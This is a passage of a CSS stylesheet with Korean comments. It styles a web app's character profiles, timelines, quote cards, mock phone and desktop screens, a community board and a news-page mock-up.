    .seg button{flex:0 0 auto;height:32px;margin:3px 0;padding:0 13px;border:0;border-radius:999px;background:var(--mist);color:var(--ink2);font-size:13.5px;font-weight:600;white-space:nowrap}
    .seg button[aria-pressed="true"]{background:var(--ink);color:var(--paper);font-weight:700}
    .sechead,.meta{display:flex;align-items:center;justify-content:space-between;gap:8px;margin:0 0 6px;font-size:12.5px;color:var(--graphite)}
    .blk{padding:14px 0 14px 16px;border-left:4px solid var(--mark);margin:0 0 14px}
    .blk h4{margin:0 0 4px;font-size:15.5px;font-weight:700}
    .blk ul{margin:0;padding:0;list-style:none}
    .blk li{padding:2px 0;font-size:14.5px;line-height:1.7;color:var(--ink2);word-break:keep-all;overflow-wrap:anywhere}
    .blk li b{color:var(--ink)}
    .li{font-size:14px;line-height:1.7;color:var(--ink2);padding:8px 0 0}.li b{color:var(--ink)}
    .tl{position:relative;padding-left:24px}
    .tl::before{content:"";position:absolute;left:6px;top:10px;bottom:10px;width:0;border-left:2px dotted var(--pencil)}
    .tl .ev{position:relative;padding-bottom:20px}
    .tl .ev::before{content:"";position:absolute;box-sizing:border-box;left:-27px;top:4px;width:20px;height:20px;border-radius:50%;background:var(--paper);border:3px solid var(--ink)}
    .tl .ev.old::before{border-color:var(--pencil)}
    .tl .date{font-size:12px;font-weight:700;color:var(--graphite);margin-bottom:2px}
    .tl .ev b{display:block;font-size:16.5px;margin-bottom:4px}
    .tl .ev p{margin:0;font-size:14.5px;line-height:1.7;color:var(--ink2)}
    .packed{display:inline-block;font-size:11px;font-weight:700;color:var(--ink2);background:var(--mist);border-radius:6px;padding:2px 7px;margin-left:6px}
    .quote{display:block;margin-top:8px;padding:2px 0 2px 12px;border-left:2px solid var(--rule);font-size:13px;line-height:1.6;color:var(--graphite)}
    .quote .evm{display:block;font-size:11.5px;font-weight:600;color:var(--pencil);margin-bottom:2px}
    .quote.bad{border-left-color:var(--bad)}
    .blk li.evq{padding:0}
    /* 명대사: 장식 없이 대사에 말한 사람 색 형광펜만 */
    .kq{position:relative;margin:0;padding:16px 0 14px 34px;border-bottom:1px solid var(--rule)}
    .kq:last-child{border-bottom:0}
    .kq::before{content:"“";position:absolute;left:-2px;top:6px;font:700 52px/1 Georgia,'Times New Roman',serif;color:var(--qfg);opacity:.35;pointer-events:none}
    .kq blockquote{margin:0;font-size:16px;font-weight:700;line-height:1.85;color:var(--ink);word-break:keep-all}
    .kq mark{color:inherit;background:linear-gradient(transparent 55%,var(--qbg) 55%);-webkit-box-decoration-break:clone;box-decoration-break:clone;padding:0 2px}
    .kq figcaption{margin-top:8px;font-size:12.5px;font-weight:600;color:var(--graphite);display:flex;align-items:center;gap:7px}
    .kq figcaption .av{width:24px;height:24px;font-size:11px}
    .kq figcaption .av::after,.subs .av::after,.ginfo .av::after{display:none}.kq figcaption .arr{font-style:normal;color:var(--pencil)}
    .quote .nar{display:block;font-style:italic;color:var(--pencil)}.quote .tr,.blk li.trl{display:block;margin-top:3px;font-size:12.5px;color:var(--ink2)}
    .blk li.trl{padding:0 0 0 14px}
    .kq-tr{margin:3px 0 0;font-size:14.5px;line-height:1.6;color:var(--ink2)}
    .kq-ctx{margin:6px 0 0;font-size:12.5px;line-height:1.55;color:var(--graphite)}
    .feel{list-style:none;margin:10px 0 0;padding:0 0 0 18px;border-left:2px dotted var(--pencil)}
    .feel li{position:relative;padding:0 0 14px}
    .feel li:last-child{padding-bottom:0}
    .feel li::before{content:"";position:absolute;box-sizing:border-box;left:-27.5px;top:4px;width:17px;height:17px;border-radius:50%;background:var(--paper);border:2.5px solid var(--pencil)}
    .feel li.now::before{background:var(--fb);border-color:var(--fc)}
    .feel li.fmid::before{width:9px;height:9px;left:-23.5px;top:6px;border-width:2px}
    .fmid summary{cursor:pointer;list-style:none;font-size:12.5px;font-weight:700;color:var(--graphite)}.fmid summary::-webkit-details-marker{display:none}
    .fmid summary::after{content:" ▾"}.fmid details[open]>summary::after{content:" ▴"}
    .fmid .feel{border-left:0;padding-left:0;margin-top:10px}
    .feel .fd{display:block;font-size:12px;color:var(--graphite);font-variant-numeric:tabular-nums}
    .feel .ff{display:inline-block;font-size:15px;font-weight:700;color:var(--ink);margin-right:8px}
    .feel li.now .ff{background:linear-gradient(transparent 58%,var(--fb) 58%);padding:0 2px}
    .feel .fw{display:block;margin-top:2px;font-size:13.5px;line-height:1.6;color:var(--ink2)}
    .feel .fa{display:inline-block;font-size:11.5px;font-weight:700;border-radius:6px;padding:1px 7px;background:var(--mist);color:var(--graphite);vertical-align:1px}
    .feel .fa.on{background:var(--fb);color:var(--fc)}
    .feel li.turn::before{content:"★";border:0;background:none;color:var(--fc);font-size:17px;line-height:1;width:auto;height:auto;left:-27px;top:1px}
    .feel li.turn .ff{font-size:16.5px;background:linear-gradient(transparent 58%,var(--fb) 58%);padding:0 2px}
    .feel .ft{font-style:normal;font-size:11px;font-weight:800;color:var(--fc);margin-right:6px}
    .item{padding:14px 0;border-bottom:1px solid var(--rule)}
    .item:last-child{border-bottom:0}
    .item h4{margin:0;font-size:14.5px;font-weight:600;color:var(--ink2);line-height:1.45}
    .item h4:has(.who-to){font-weight:500}.item h4 .who-to{font-weight:800}
    .item h4 .arr{font-style:normal;color:var(--pencil);font-weight:400;margin:0 2px}
    .item-sub{margin:3px 0 0;font-size:13.5px;line-height:1.6;color:var(--graphite)}
    .item-text{margin:6px 0 0;font-size:14.5px;line-height:1.65;color:var(--ink2)}
    .item .wear,.item .spchips,.item .kv{margin-top:8px}
    .kv{display:grid;grid-template-columns:max-content minmax(0,1fr);gap:7px 14px;align-items:baseline}
    .kv .k{font-size:14px;font-weight:700;color:var(--ink);white-space:nowrap}
    .kv .v{font-size:14px;line-height:1.6;color:var(--ink2);overflow-wrap:anywhere}.kv.kv-stack{display:flex;flex-direction:column;gap:3px}.kv-stack .k{white-space:normal;margin-top:14px;display:flex;flex-wrap:wrap;align-items:center;gap:6px}.kv-stack .k:first-child{margin-top:0}.kv-stack .k:empty{display:none}.kv-stack .v{padding-left:2px}
    .pill{display:inline-block;font-size:12px;font-weight:700;border-radius:6px;padding:1px 7px;margin-right:6px;vertical-align:1px}
    .item .quote{margin-top:6px}
    /* 근거 버튼은 어디서나 '아래 줄'에 둡니다. inline으로 두면 자리가 남을 땐 오른쪽, 모자라면 아래로 가서 화면마다 제자리가 달라져요. */
    details.evd{display:block;margin:6px 0 0}
    .kv details.evd,.nv details.evd{display:block}
    details.evd>summary{display:inline-flex;align-items:center;gap:3px;list-style:none;cursor:pointer;font-size:12px;font-weight:700;color:var(--graphite);
      border:1px solid var(--rule);border-radius:999px;padding:1px 8px;margin-left:0;vertical-align:1px;white-space:nowrap}
    details.evd>summary::-webkit-details-marker{display:none}
    details.evd>summary::after{content:"▾";font-size:10px}
    details.evd[open]>summary{background:var(--ink);border-color:var(--ink);color:#fff}
    details.evd[open]>summary::after{content:"▴"}
    details.evd.bad>summary{color:var(--bad);border-color:#EBC3CC}
    details.evd[open]>.quote{display:block;margin:8px 0 2px}
    .profile .kv details.evd,.ncard .nv details.evd{margin-top:8px}  /* 프로필·인물 카드는 줄 간격이 좁아 조금 더 띄웁니다 */
    .spchips{align-items:center}
    .spc{align-items:center}
    .outfit-row .t .av{width:34px;height:34px;font-size:14px}
    .wear{display:flex;flex-wrap:wrap;gap:6px;margin-top:4px}
    .wear span{font-size:13.5px;line-height:1.5;color:var(--ink2);background:var(--mist);border-radius:8px;padding:3px 10px}
    .outfit{margin:0;font-size:14.5px;line-height:1.7;color:var(--ink2)}
    .row .quote{margin-top:8px}
    .blk li.hist{display:flex;gap:8px;align-items:baseline}
    .hist>b{flex-shrink:0;font-size:12.5px;color:var(--graphite)}
    .hist span{display:flex;flex-wrap:wrap;align-items:center;gap:4px 6px}
    .hist em{font-style:normal;font-size:13.5px;background:var(--mist);border-radius:8px;padding:2px 8px}
    .hist i{font-style:normal;color:var(--pencil)}
    .filter{display:flex;gap:14px}
    .filter button{border:0;border-radius:999px;background:var(--mist);padding:4px 11px;font-size:13px;font-weight:600;color:var(--ink2)}
    .filter button[aria-pressed="true"]{background:var(--ink);color:var(--paper);font-weight:700}

    /* ── 인물 한 명 화면 ── */
    .phero{display:flex;align-items:center;gap:14px;padding:4px 0 16px;margin:0 0 4px;border-bottom:1px solid var(--rule)}
    .phero .av{width:58px;height:58px;font-size:25px}
    .phero b{font-size:20px;font-weight:800;color:var(--ink)}
    .phero em{font-style:normal;font-size:12.5px;font-weight:600;color:var(--graphite);margin-left:8px}
    .phero p{margin:4px 0 0;font-size:13.5px;line-height:1.55;color:var(--ink2);word-break:keep-all}
    .pcat{padding:14px 0 10px;border-bottom:1px solid var(--rule)}
    .pcat:last-child{border-bottom:0}
    .pcat h5{margin:0 0 6px;font-size:14px;font-weight:700;color:var(--ink)}
    .prow{display:grid;grid-template-columns:minmax(64px,max-content) minmax(0,1fr);gap:12px;align-items:baseline;padding:4px 0}
    .pk{font-size:12.5px;font-weight:600;color:var(--graphite);white-space:nowrap}
    /* 이름·부르는 말을 한 줄에: 펼칠 때 부르는 말이 숨어도 얼굴이 움직이지 않게 */
    .pgrp .fold-t{display:flex;align-items:center;gap:10px}
    .pgrp .fold-t .av{flex:none;width:30px;height:30px;font-size:15px}.pgrp .fold-t small{display:inline;margin:0}
    .pgrp .fold>summary{padding:10px 0}.pgrp:last-child .fold{border-bottom:0}
    .pgh{display:flex;align-items:center;gap:8px;margin:0 0 2px}.pgh .av{width:26px;height:26px;font-size:13px}.pgh b{font-size:14px;font-weight:700}
    .pgrp .prow.pev{padding:3px 0}.pgrp .prow.pev .pk{margin-bottom:0}
    .prow.pev{display:block;padding:6px 0}.prow.pev .pk{display:block;margin-bottom:2px}
    .prow.pstk{display:block;padding:9px 0}.prow.pstk+.prow.pstk{border-top:1px dashed var(--rule)}
    .prow.pstk .pk{display:block;margin-bottom:3px;font-size:13px;font-weight:700;color:var(--ink);white-space:normal}
    .prow.pstk .pv{display:block;font-size:13.5px}
    .pkh{display:flex;flex-wrap:wrap;align-items:center;gap:4px 8px}
    .pkh b{min-width:0;font-size:13.5px;font-weight:700;color:var(--ink);line-height:1.5;overflow-wrap:anywhere}
    .pkh .pill{margin:0;flex:none}
    .pnt{margin:3px 0 0;font-size:13px;line-height:1.55;color:var(--graphite);overflow-wrap:anywhere}
    .pnt::before{content:"⤷ ";opacity:.7}
    .pnt i{font-style:normal;font-weight:700;margin-right:6px}
    .prow.pstk .pline{margin:3px 0 0}
    .pmem .prow{padding:4px 0;align-items:start}
    .pmem .pk{padding-top:1px}
    .pnote{display:inline-block;margin-top:2px;font-size:12.5px}.pnote i{font-style:normal;font-weight:600;margin-right:6px}
    .pdir{margin:8px 0 10px;padding:2px 0 2px 12px;border-left:3px solid var(--dc)}
    .pside{display:inline-block;margin:2px 0 4px;padding:2px 9px;border-radius:6px;background:var(--db);color:var(--ink);font-size:13px;font-weight:600}.pside b{font-weight:800}
    .pdir .pk{font-size:11.5px;letter-spacing:.02em}.pdir .pv{font-size:14.5px;line-height:1.6}
    .pcat.cgx h5{font-size:12.5px;font-weight:700;color:var(--ink2)}
    .chg-l{margin:4px 0;font-size:13.5px;line-height:1.6;color:var(--ink)}.chg-l.chg-before{color:var(--graphite)}.chg-l.chg-gone{color:var(--pencil)}.chg-new .rk,.chg-l.chg-new .rk{background:var(--sky);color:#2F6FB8}.chg-l.chg-after .rk{background:var(--sage);color:var(--ok)}.chg-l.chg-gone .rk{background:var(--blush);color:var(--bad)}
    .chg-row{padding:6px 0}.chg-gone{color:var(--pencil)}.chg-who{margin:0 0 2px;font-size:13px}
    .chg-k{margin:10px 0 2px;font-size:11.5px;font-weight:700;color:var(--graphite)}
    .chg-old{margin:1px 0;font-size:13px;line-height:1.6;color:var(--graphite)}
    .chg-new{margin:1px 0;font-size:14px;line-height:1.6;color:var(--ink)}.chg-t{margin-top:8px}.chg-t:first-child{margin-top:0}
    .chg-ev{margin:1px 0 4px;font-size:12px;line-height:1.5;color:var(--graphite)}.chg-ev.bad{color:var(--bad);font-weight:600}
    .pcat .chg-new+.chg-old{margin-top:4px}
    .pv{font-size:14px;line-height:1.6;color:var(--ink);min-width:0;overflow-wrap:anywhere}.pv b{font-weight:700}
    .pv .addr{font-weight:600}
    .pv .pill{margin:0 4px 0 0}
    .pdim{color:var(--graphite);font-size:13px}
    .pline{margin:2px 0;font-size:14px;line-height:1.6;color:var(--ink)}
    .pquote{margin:4px 0;font-size:14.5px;font-weight:600;line-height:1.7;color:var(--ink)}

    /* ── 📱 폰 (아이폰 느낌) ── */
    .tl-who .ph-new{font-style:normal;font-size:10px;font-weight:800;color:#fff;background:#FF3B30;border-radius:999px;padding:0 5px;margin-top:-4px}
    .iphone{position:relative;width:min(400px,100%);height:auto;aspect-ratio:9/19.5;margin:6px auto 0;border-radius:48px;border:10px solid #16161a;background:#000;box-shadow:0 18px 40px rgba(0,0,0,.18),inset 0 0 0 2px #2c2c30}
    /* 💻 컴퓨터: 모니터 테두리 · 위 메뉴줄 · 바탕화면 아이콘 · 창 하나 */
    .seg.devseg{position:static}
    .pc{width:100%;height:min(560px,72vh);margin:6px auto 0;border-radius:16px;border:10px solid #1d1d22;border-bottom-width:22px;background:#1d1d22;box-shadow:0 18px 40px rgba(0,0,0,.18)}
    .pc-stand{display:block;width:90px;height:16px;margin:0 auto;background:linear-gradient(#2a2a30,#3a3a42);clip-path:polygon(12% 0,88% 0,100% 100%,0 100%)}
    .pc-screen{position:relative;height:100%;border-radius:6px;overflow:hidden;display:flex;flex-direction:column;background:#22252c;font-family:-apple-system,'Segoe UI','Apple SD Gothic Neo',system-ui,sans-serif;--emoji:'Apple Color Emoji','Segoe UI Emoji','Noto Color Emoji',sans-serif}
    .pc-bar{flex:none;display:flex;justify-content:space-between;gap:8px;padding:5px 12px;font-size:12px;color:#fff;background:#2b2f38;backdrop-filter:blur(8px)}
    .pc-bar b{font-weight:600}
    .pc-desk{position:relative;flex:1;min-height:0;background:radial-gradient(120% 90% at 20% 10%,var(--wb),var(--wf));overflow:hidden}
    .pc-wall{position:absolute;right:12px;bottom:8px;font-size:11px;color:#fff;opacity:.75}
    .pc-icons{display:grid;grid-template-columns:repeat(auto-fill,minmax(76px,1fr));gap:6px;padding:12px;max-height:100%;overflow-y:auto;scrollbar-width:none}
    .pc-ic{border:0;background:transparent;display:flex;flex-direction:column;align-items:center;gap:4px;padding:6px 2px;border-radius:8px;cursor:pointer;color:#fff}
    .pc-ic:hover{background:rgba(255,255,255,.18)}
    .pc-ic i{font-style:normal;font-size:30px;line-height:1;font-family:var(--emoji)}
    .pc-ic span{font-size:11.5px;line-height:1.3;text-align:center;text-shadow:0 1px 2px rgba(0,0,0,.5);overflow-wrap:anywhere;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
    .pc-stk{position:absolute;right:12px;bottom:28px;display:flex;flex-direction:column;gap:8px;max-width:150px}
    .pc-sticky{margin:0;padding:8px 10px;background:#FFF3A3;color:#4a4220;font-size:12px;line-height:1.45;box-shadow:0 3px 8px rgba(0,0,0,.2);transform:rotate(-1.5deg)}
    .pc-sticky:nth-child(2n){transform:rotate(1.2deg);background:#FFD8E4}
    .pc-win{position:absolute;inset:10px;display:flex;flex-direction:column;background:#fff;border-radius:10px;box-shadow:0 12px 36px rgba(0,0,0,.35);overflow:hidden;color:#1d1d1f}
    .pc-wt{flex:none;display:flex;align-items:center;gap:6px;padding:8px 10px;background:#ececf0;border-bottom:1px solid #d9d9de}
    .pc-wt i{width:11px;height:11px;border-radius:50%;background:#ff5f57}.pc-wt i:nth-child(2){background:#febc2e}.pc-wt i:nth-child(3){background:#28c840}
    .pc-wt button{order:9;margin-left:auto;border:0;background:transparent;font-size:13px;color:#555;cursor:pointer;padding:2px 6px}
    .pc-wt b{flex:1;min-width:0;text-align:center;font-size:13px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.pc-wt b small{font-weight:400;color:#888}
    .pc-wb{flex:1;overflow-y:auto;padding:12px 16px;font-size:13.5px;line-height:1.65}
    .pc-wb p{margin:0 0 4px}
    .pc-h{margin:12px 0 4px!important;font-size:11.5px;font-weight:700;color:#888}.pc-h:first-child{margin-top:0!important}
    .pc-meta{font-size:12px;color:#888;margin:0 0 10px!important}
    .pc-list{display:flex;flex-direction:column}
    .pc-list button{display:grid;grid-template-columns:minmax(0,1fr) auto;column-gap:10px;text-align:left;border:0;border-bottom:1px solid #eee;background:transparent;padding:8px 2px;color:inherit;cursor:pointer}
    .pc-list button:disabled{cursor:default;opacity:1}
    .pc-list b{font-weight:600;font-size:13.5px;overflow-wrap:anywhere}.pc-list small{grid-column:1;font-size:12px;color:#888;overflow-wrap:anywhere}
    .pc-list em{grid-column:2;grid-row:1/3;align-self:center;font-style:normal;font-size:11.5px;color:#999;max-width:120px;text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .pc-empty{color:#999;font-size:12.5px}
    .pc-chat{display:flex;flex-direction:column;gap:6px}
    .pc-chat p{max-width:78%;margin:0!important;padding:7px 11px;border-radius:12px;background:#f0f0f3;font-size:13.5px;line-height:1.5}
    .pc-chat p.me{align-self:flex-end;background:#0A84FF;color:#fff}
    .pc-chat small{display:block;font-size:11px;font-weight:600;color:#666}
    .pc-chat em{display:block;font-style:normal;font-size:10.5px;opacity:.6;margin-top:2px}
    .pc-photos{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px}
    .pc-photos figure{margin:0}.pc-photos span{display:flex;align-items:center;justify-content:center;aspect-ratio:1;border-radius:8px;background:#f0f0f3;font-size:40px;font-family:var(--emoji)}
    .pc-photos figcaption{font-size:12px;line-height:1.4;margin-top:4px}.pc-photos small{display:block;color:#999;font-size:11px}
    .pc-pw{text-align:center;padding:30px 0}.pc-pw p{margin:0 0 14px!important}
    .pc-lock{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;padding:20px;text-align:center;color:#fff;background:radial-gradient(120% 90% at 20% 10%,var(--wb),var(--wf))}
    /* 🗨 커뮤니티: 앱 화면 같은 카드 하나 */
    .bd{border:1px solid var(--rule);border-radius:16px;overflow:hidden;background:var(--paper)}
    .bd-empty{display:flex;flex-direction:column;align-items:center;gap:8px;padding:40px 20px;text-align:center}.bd-empty small{font-size:12px;color:var(--graphite)}.bd-empty .ph-make{margin-top:10px;background:var(--mist)}
    .bd-top{display:flex;align-items:baseline;gap:8px;flex-wrap:wrap;padding:14px 16px 10px;border-bottom:1px solid var(--rule)}.bd-top b{font-size:16px}.bd-top small{font-size:12px;color:var(--graphite)}
    .bd-top button{border:0;background:transparent;font-size:13.5px;color:var(--ink2);padding:0;cursor:pointer}
    .bd-tabs{display:flex;gap:6px;overflow-x:auto;scrollbar-width:none;padding:10px 16px;border-bottom:1px solid var(--rule)}
    .bd-tabs button{flex:none;border:0;border-radius:999px;background:var(--mist);color:var(--ink2);font-size:12.5px;font-weight:600;padding:4px 11px}.bd-tabs button[aria-pressed="true"]{background:var(--ink);color:var(--paper)}
    .bd-hot{font-style:normal;font-size:10.5px;font-weight:800;color:#fff;background:var(--bad);border-radius:999px;padding:1px 6px;margin-right:6px;vertical-align:2px}
    .bd-post{padding:14px 16px;border-bottom:1px solid var(--rule)}.bd-post>*:last-child{margin-bottom:0}.bd-post h4{margin:0 0 4px;font-size:16px}.bd-post p{margin:0 0 4px;font-size:14px;line-height:1.65}
    .bd-meta{font-size:12px!important;color:var(--graphite)}.bd-meta b{color:var(--ink2)}
    .nw-hid button{width:100%;text-align:left;border:1px dashed var(--rule);background:var(--mist);border-radius:10px;
      padding:7px 12px;font-size:12.5px;color:var(--graphite);cursor:pointer}
    .nw-hid button:active{background:var(--fb)}
    .bd-cmts{padding:6px 16px 12px}.bd-c{padding:8px 0;border-bottom:1px dashed var(--rule)}.bd-c.re{padding-left:18px}.bd-c p{margin:0;font-size:13.5px;line-height:1.55}.bd-to{color:var(--graphite);font-size:12.5px}
    .bd-site{padding:14px 16px 12px;color:#fff;display:flex;flex-direction:column;gap:2px}.bd-site b{font-size:17px;font-weight:800}.bd-site small{font-size:12px;opacity:.85}
    .bd-cover{height:86px}
    .bd-head{display:flex;align-items:flex-end;gap:12px;padding:0 16px 12px;margin-top:-30px;border-bottom:1px solid var(--rule)}
    .bd-logo{flex:none;width:64px;height:64px;border-radius:18px;border:3px solid var(--paper);color:#fff;font-size:20px;font-weight:900;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(0,0,0,.15)}
    .bd-hn{display:flex;flex-direction:column;gap:1px;min-width:0;padding-top:34px}.bd-post h4{color:var(--ink)}.bd-hn b{font-size:17px;font-weight:800;color:var(--ink)}.bd-hn small{font-size:12px;color:var(--graphite)}.bd-hn small:nth-of-type(1){color:var(--ink2);font-size:12.5px}
    .bd-notice{border-bottom:1px solid var(--rule)}.bd-notice details{margin:0;border-top:1px solid var(--rule)}.bd-notice details:first-child{border-top:0}
    .bd-notice summary{list-style:none;cursor:pointer;padding:9px 16px;font-size:13px;line-height:1.5;color:var(--ink)}.bd-notice summary::-webkit-details-marker{display:none}
    .bd-notice summary em{font-style:normal;font-size:11px;font-weight:800;color:var(--bad);margin-right:8px}.bd-notice p{margin:0;padding:0 16px 10px;font-size:13px;line-height:1.6;color:var(--ink2)}
    .bd-spots{display:flex;gap:8px;overflow-x:auto;scrollbar-width:none;padding:0 16px 10px}.bd-spots span{flex:none;display:flex;flex-direction:column;gap:1px;padding:8px 12px;border-radius:12px;background:var(--mist);max-width:200px}
    .bd-spots b{font-size:13px}.bd-spots small{font-size:11.5px;color:var(--graphite)}
    .bd-menu{display:flex;gap:2px;overflow-x:auto;scrollbar-width:none;padding:0 8px;border-bottom:1px solid var(--rule);background:var(--paper)}
    .bd-menu button{flex:none;border:0;background:transparent;padding:10px 10px;font-size:13px;font-weight:600;color:var(--ink2);cursor:pointer}.bd-menu button[aria-pressed="true"]{color:var(--ink);font-weight:800;box-shadow:inset 0 -2px 0 var(--ink)}
    .bd-sec{margin:0;padding:12px 16px 6px;font-size:13px;font-weight:800;color:var(--ink)}
    .bd-rank{padding:0 16px 8px}.bd-rank button{display:flex;gap:10px;width:100%;text-align:left;border:0;background:transparent;padding:6px 0;font-size:13.5px;color:var(--ink);cursor:pointer}.bd-rank em{font-style:normal;font-weight:800;color:var(--bad);width:14px}
    .bd-row{display:block;width:100%;text-align:left;border:0;border-top:1px solid var(--rule);background:transparent;padding:10px 16px;cursor:pointer;color:var(--ink)}.bd-row b{display:block;font-size:14px;font-weight:600;line-height:1.5}.bd-row small{display:block;font-size:12px;color:var(--graphite);margin-top:1px}
    .bd-tag{color:var(--graphite);font-weight:600}.bd-cn{color:var(--bad);font-weight:700;font-size:12.5px}.bd-ip{color:var(--pencil);font-weight:400}
    .bd-crumb{margin:0 0 6px}.bd-crumb button{border:0;background:transparent;padding:0;font-size:12.5px;color:var(--graphite);cursor:pointer}
    .bd-author{display:flex;align-items:center;gap:10px;margin:8px 0 12px!important;padding-bottom:12px;border-bottom:1px solid var(--rule)}.bd-author>span:last-child{display:flex;flex-direction:column;gap:1px}.bd-author small{font-size:12px;color:var(--graphite)}
    .bd-av{width:34px;height:34px;font-size:14px;font-weight:700;background:var(--mist);color:var(--graphite)}
    .bd-post .bd-body p{margin:0 0 10px;font-size:14.5px;line-height:1.75}.bd-post .bd-body p:last-child{margin-bottom:0}.bd-gap{display:block}
    .bd-vote{display:flex;justify-content:center;gap:10px;margin:18px 0 4px}.bd-vote button{border:1px solid var(--rule);border-radius:999px;background:var(--paper);padding:6px 14px;font-size:13px;color:var(--ink2);cursor:pointer}
    .bd-vote button[aria-pressed="true"]{border-color:var(--bad);color:var(--bad);background:#FFF1F3}
    .bd-write{display:flex;gap:6px;margin:10px 0 2px}.bd-write input{flex:1;min-width:0;height:38px;border:1.5px solid var(--rule);border-radius:10px;padding:0 12px;font-size:14px;background:var(--paper);color:var(--ink)}.bd-write input:focus{outline:none;border-color:var(--ink)}
    .bd-write button{flex:none;border:0;border-radius:10px;background:var(--ink);color:var(--paper);font-size:13px;font-weight:700;padding:0 14px}.bd-write button:disabled{opacity:.4}
    .bd-write input.bd-nick{flex:0 0 64px;width:64px;min-width:0;height:38px;border:1.5px solid var(--rule);border-radius:10px;padding:0 8px;font-size:13px;background:var(--paper);color:var(--ink)}
    .bd-anon{flex:none;display:flex;align-items:center;gap:4px;font-size:12.5px;color:var(--ink2);cursor:pointer}.bd-anon input{flex:none;width:16px;height:16px;margin:0;padding:0;border:0;accent-color:var(--ink)}
    .bd-write-r{margin:4px 0 8px 18px}.bd-x{flex:none;border:0;background:transparent;color:var(--graphite);font-size:13px;padding:0 6px;cursor:pointer}
    .bd-pager{display:flex;justify-content:center;align-items:center;gap:4px;margin:10px 0 2px;flex-wrap:wrap}.bd-pager button{min-width:30px;height:30px;border:1px solid var(--rule);border-radius:8px;background:var(--paper);color:var(--ink2);font-size:12.5px;cursor:pointer}.bd-pager button[aria-pressed="true"]{background:var(--ink);color:var(--paper);border-color:var(--ink);font-weight:700}.bd-pager span{color:var(--graphite);font-size:12px}.bd-rep{border:0;background:transparent;padding:0 0 0 6px;font-size:11.5px;color:var(--graphite);cursor:pointer;margin-left:auto}.bd-c.to{background:#EEF2F7}
    .bd-to{margin:8px 0 0;font-size:12.5px;color:var(--ink2)}.bd-to button{border:0;background:transparent;color:var(--graphite);cursor:pointer;font-size:12px}
    .bd-op{font-style:normal;font-size:10.5px;font-weight:800;color:#2F6FB8;background:var(--sky);border-radius:4px;padding:0 5px;margin-left:4px}
    .bd-c.mine{background:#F6F7FF}.bd-me{font-style:normal;font-size:10.5px;font-weight:800;color:#fff;background:var(--ink);border-radius:4px;padding:0 5px;margin-left:4px}
    .bd-typing .dots{display:inline-flex;gap:3px;vertical-align:middle}.bd-typing .dots i{width:5px;height:5px;border-radius:50%;background:var(--pencil);animation:bdDot 1s infinite}.bd-typing .dots i:nth-child(2){animation-delay:.15s}.bd-typing .dots i:nth-child(3){animation-delay:.3s}
    @keyframes bdDot{0%,60%,100%{opacity:.25;transform:translateY(0)}30%{opacity:1;transform:translateY(-3px)}}
    .bd-ch{margin:0 0 4px;font-size:13px;color:var(--ink2)}.bd-ch b{color:var(--bad)}
    .bd-cw{display:flex;flex-wrap:wrap;align-items:center;gap:4px 6px;margin-bottom:2px!important}.bd-cw small{font-size:11.5px;color:var(--pencil)}.bd-cw i{font-style:normal;color:var(--pencil)}
    .bd .pc-empty{margin:0;padding:28px 16px;text-align:center;color:var(--graphite);font-size:13px}
    .bd-more{display:flex;justify-content:space-between;width:100%;border:0;border-top:6px solid var(--mist);background:transparent;text-align:left;cursor:pointer}.bd-more span{color:var(--graphite)}
    .bd,.bd-body p,.bd-ct,.bd-row b,.bd-rank span{color:var(--ink)}.bd-ct{font-size:14px!important;line-height:1.6!important}.bd-cw b{color:var(--ink)}
    .bd-best{font-style:normal;font-size:10.5px;font-weight:800;color:#fff;background:#F2994A;border-radius:999px;padding:1px 6px;margin-right:6px;vertical-align:2px}
    .nw-cat{font-style:normal;font-size:10.5px;font-weight:800;color:var(--ink2);border:1px solid var(--rule);border-radius:4px;padding:0 5px;margin-right:6px;vertical-align:1px}.nw-cat.hot{color:var(--bad);border-color:currentColor}
    .nw-top{display:flex;align-items:center;gap:10px;padding:14px 14px 6px}.nw-logo{font-size:19px;font-weight:900;letter-spacing:-.03em;white-space:nowrap}
    .nw-search{flex:1;min-width:0;display:flex;align-items:center;height:34px;border:2px solid;border-radius:999px;padding:0 0 0 12px;font-size:12.5px;color:var(--ink2);overflow:hidden}.nw-search>span{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.nw-search i{font-style:normal;width:34px;height:34px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px}
    .nw-date{margin:0;padding:0 14px 8px;font-size:11.5px;color:var(--graphite);border-bottom:1px solid var(--rule)}
    .nw-lead{display:block;width:100%;text-align:left;border:0;background:transparent;padding:12px 14px;border-bottom:1px solid var(--rule);cursor:pointer;color:var(--ink)}.nw-lead b{display:block;font-size:15.5px;line-height:1.4;margin:10px 0 4px}.nw-lead>small{font-size:11.5px;color:var(--graphite)}
    .nw-pic{display:flex;align-items:flex-end;height:120px;border-radius:10px;padding:10px;opacity:.9}.nw-pic .nw-pc{margin:0;width:100%;display:flex;flex-direction:column;align-items:center;gap:4px}.nw-pic .nw-em{font-size:40px;line-height:1.1;letter-spacing:2px}.nw-pic small{color:#fff;font-size:11.5px;text-shadow:0 1px 3px rgba(0,0,0,.35)}
    .nw-sr{padding:12px 14px}.nw-q{margin:2px 0 10px;font-size:15px}.nw-sub{margin:14px 0 6px;font-size:12px;font-weight:800;color:var(--graphite)}
    .nw-rel{display:flex;flex-wrap:wrap;gap:6px}.nw-rel span{font-size:12.5px;padding:4px 10px;border:1px solid var(--rule);border-radius:999px}
    .nw-hit{padding:8px 0;border-top:1px dashed var(--rule)}.nw-hit small{display:block;font-size:11px;color:var(--graphite)}.nw-hit b{display:block;font-size:13.5px;margin:2px 0}.nw-hit p{margin:0;font-size:12.5px;color:var(--ink2);line-height:1.5}
    .nw-fact{margin:12px 0 0;padding:10px 0 0;border-top:1px dashed var(--rule);font-size:12.5px;text-align:center}.nw-fact p{margin:0 0 6px;color:var(--ink2);line-height:1.5}
    .nm-edit{border:0;background:transparent;font-size:12px;padding:2px;cursor:pointer;opacity:.6}.name-edit{margin:8px 12px 0}
